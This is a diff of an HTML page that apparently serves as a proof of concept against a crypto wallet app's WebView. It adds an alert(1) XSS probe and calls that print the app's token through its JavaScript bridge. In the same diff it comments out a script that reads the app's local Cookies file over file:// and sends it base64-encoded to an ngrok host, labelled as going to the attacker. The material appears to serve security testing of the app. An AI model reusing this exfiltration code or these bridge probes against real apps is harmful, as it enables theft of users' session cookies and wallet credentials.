@@ -16,17 +16,10 @@
         <br/>
 	<br/>
 	<br/>
-        <script type="text/javascript">
-        document.write("token: " + ReactNativeWebView.getId());
-        </script>
-
-        <script type="text/javascript">
-        document.write("address: " + ReactNativeWebView.getWalletAddress());
-        </script>
-
+<script>alert(1);</script>
 	    
         <script type="text/javascript">
-        document.write("xfling: " + ReactNativeWebView.getXFlingVelocity());
+        document.write("token: " + JavaScriptInterface.getToken());
         </script>
 
 	// file access from file URIs - attempt#1
@@ -58,16 +51,16 @@
      //   });
    // </script>
 
-<script>
-    var url = 'file:///data/data/io.stormbird.wallet/app_webview/Default/Cookies'; //local filefunction load(url) {
-        var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-            fetch('https://19af-24-34-211-231.ngrok.io/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
-            }
-        }xhr.open('GET', url, true);
-        xhr.send('');
-    }load(url)
-</script>
+//<script>
+    //var url = 'file:///data/data/io.stormbird.wallet/app_webview/Default/Cookies'; //local filefunction load(url) {
+     //   var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {
+      //      if (xhr.readyState === 4) {
+        //    fetch('https://19af-24-34-211-231.ngrok.io/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+          //  }
+       // }xhr.open('GET', url, true);
+       // xhr.send('');
+    //}load(url)
+//</script>
 	    
 	    
 	    
